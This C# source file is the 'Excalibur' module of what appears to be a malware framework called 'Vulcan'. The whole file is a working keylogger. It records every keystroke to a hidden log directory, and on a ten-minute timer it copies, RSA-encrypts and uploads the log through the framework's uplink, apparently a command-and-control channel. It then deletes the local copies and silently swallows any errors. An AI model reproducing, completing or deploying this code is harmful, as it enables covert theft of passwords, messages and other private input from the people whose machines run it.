using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;
using System.Windows.Forms;
using System.Timers;
using Vulcan.Core;
using Vulcan.Core.Uplink;

namespace ModuleExcalibur
{
    public class ExcaliburThread
    {
        private IVulcanUplink uplink = VulcanConfiguration.Instance.PrimaryUplink;

        private string logDir;
        private string logFile;
        private Thread loggingThread;
        private KeyLogger logger;
        private StreamWriter logWriter;
        private int keysLogged = 0;
        private System.Timers.Timer timer = new System.Timers.Timer(600000);

        public void Start()
        {
            timer.Elapsed += timerElapsed;
            timer.Start();
            logDir = VulcanConfiguration.Instance.InstallLocation + "\\.VLCNLOG";
            logFile = logDir + "\\.VLCNKLG";
            logger = new KeyLogger();
            logger.OnKeyPress = newKeyPress;
            loggingThread = new Thread(log);
            loggingThread.Start();

        }

        private void timerElapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                lock (logWriter)
                {
                    logWriter.Close();

                    string fname = logDir + "\\" + Path.GetRandomFileName() + ".log";
                    File.Copy(logFile, fname);
                    FileHelper.EncryptRSA(fname);


                    uplink.SendFile(fname, "Excalibur data");
                    uplink.SendFile(fname + ".key", "Excalibur Key");
                    
                    logWriter = new StreamWriter(logFile);
                    File.Delete(fname);
                    File.Delete(fname + ".key");
                }
            }
            catch
            {

            }
            timer.Start();
        }


        private void newKeyPress(Keys k)
        {
            lock (logWriter)
            {
                logWriter.Write(((int)k).ToString("x8"));
                keysLogged++;
                if (keysLogged > 100)
                {
                    logWriter.Flush();
                    keysLogged = 0;
                }
            }
        }

        private void log()
        {
            try
            {
                if (!Directory.Exists(logDir))
                    FileHelper.CreateDirectory(logDir);
                logWriter = new StreamWriter(logFile);
                logger.Log();
            }
            catch (Exception ex)
            {
                return;
            }
        }
    }
}
